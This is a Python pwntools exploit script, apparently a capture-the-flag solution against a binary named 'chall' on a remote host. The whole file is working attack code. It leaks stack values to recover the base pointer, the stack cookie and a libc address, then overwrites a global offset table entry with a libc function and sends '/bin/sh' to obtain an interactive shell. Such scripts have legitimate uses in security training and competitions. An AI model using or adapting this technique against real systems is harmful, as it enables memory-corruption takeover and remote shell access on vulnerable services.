from pwn import *


DEBUG = int(sys.argv[1]);
if(DEBUG == 0):
    r = remote("13.231.207.73", 9005);
elif(DEBUG == 1):
    r =process("./chall");
elif(DEBUG == 2):
    r =process("./chall");
    gdb.attach(r, '''source script''');


def halt():
    while(True):
        log.info(r.recvline());

def sendNumber(n):
    log.info(r.recvuntil('='));
    r.sendline("%d" % n);

def trigger():
    log.info(r.recvuntil('='));
    r.sendline("1");
    log.info(r.recvuntil('='));
    r.sendline('');

def exploit():
    sendNumber(20);
    for i in range(0, 12):
        sendNumber(0);

    sendNumber(18);

    #padding
    sendNumber(0x400a10);

    log.info(r.recvuntil("="));
    leaked = r.recvuntil('\n')[:-1];
    leakedValue1 = int(leaked);
    if(leakedValue1 < 0):
        leakedValue1 = (1<<64) + leakedValue1;
    log.info("%s" % leaked);
    log.info("%x" % leakedValue1);

    for i in range(0, 12):
        sendNumber(0);
    sendNumber(16);
    sendNumber(0);
    sendNumber(0);
    sendNumber(0x400a10);

    log.info(r.recvuntil("="));
    leaked = r.recvuntil('\n')[:-1];
    leakedValue2 = int(leaked);
    if(leakedValue2 < 0):
        leakedValue2 = (1<<64) + leakedValue2;
    log.info("%s" % leaked);
    log.info("%x" % leakedValue2);

    rbpAddress = leakedValue1 - leakedValue2;
    log.info("rbp value: 0x%x" % rbpAddress);
    arrayAddress = rbpAddress - 0xa0;
    log.info("Array address value: 0x%x" % arrayAddress);
    stackCookie = leakedValue2 - arrayAddress - 0x13 - 0x400a15;
    log.info("Cookie value: 0x%x" % stackCookie);

    for i in range(0, 12):
        sendNumber(0);
    sendNumber(12);
    sendNumber(0);
    #modify array address
    sendNumber(arrayAddress + 0x20);
    #modify return main
    sendNumber(0x400a10);
    sendNumber(0);
    #modify libc_start
    sendNumber(0x400a10);
    sendNumber(0);
    sendNumber(0);
        
    log.info(r.recvuntil('='));

    for i in range(0, 12):
        sendNumber(0);
    sendNumber(12);
    sendNumber(0);
    sendNumber(0x6010a0);
    sendNumber(0);
    sendNumber(0);
    sendNumber(0);
    sendNumber(0);
    sendNumber(0);
    log.info(r.recvuntil('='));

    leaked = r.recvuntil('\n')[:-1];
    leakedValue3 = int(leaked);
    if(leakedValue3 < 0):
        leakedValue3 = (1<<64) + leakedValue3;
    log.info("%s" % leaked);
    log.info("%x" % leakedValue3);
    leakedLibcAddress = leakedValue3 - 0x14 - 0x3c5540;
    log.info("Leaked libc address: 0x%x" % leakedLibcAddress);


    #log.info(r.recvuntil('='));
    for i in range(0, 12):
        sendNumber(0);

    sendNumber(12);
    sendNumber(0);
    sendNumber(0x600fd0);
    sendNumber(leakedLibcAddress + 0x45390);
    log.info(r.recvuntil('='));
    r.sendline("/bin/sh");
    r.interactive();


exploit();
